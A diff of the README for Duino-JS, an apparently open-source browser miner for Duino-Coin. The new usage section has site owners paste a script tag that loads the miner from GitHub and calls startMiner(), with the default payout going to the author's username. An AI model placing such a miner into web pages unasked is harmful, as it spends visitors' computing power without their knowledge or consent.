@@ -23,12 +23,12 @@ didn't work, so I decided to write one myself in JavaScript, to use on my future
 - The username to mine to can be changed easily, just like the server ip and protocol (if that ever changes).
 
 ## Usage
-It calculates the hashes with ©jsHashes, so you need to import that too:
+To use the miner, put this at the end of your html:
 ```html
-<script src="https://raw.githubusercontent.com/h2non/jshashes/master/hashes.min.js"></script> <!--imports the jsHashes library-->
-<script src="https://raw.githubusercontent.com/Hoiboy19/Duino-JS/main/duino-js.min.js"></script> <!--imports the Duino-JS library-->
+<script src="https://raw.githubusercontent.com/Hoiboy19/Duino-JS/main/duino-js.min.js"></script> <!--imports the Duino-JS miner-->
 <script>
-    var username = "Hoiboy19"; //put you username here (e.g. revox, ericddm, snehaislove or Hoiboy19), the default is Hoiboy19.
+    var username = "Hoiboy19"; //put your username here (e.g. revox, ericddm, snehaislove or Hoiboy19), the default is Hoiboy19.
+    startMiner(); //starts the miner
 </script>
 ```
 
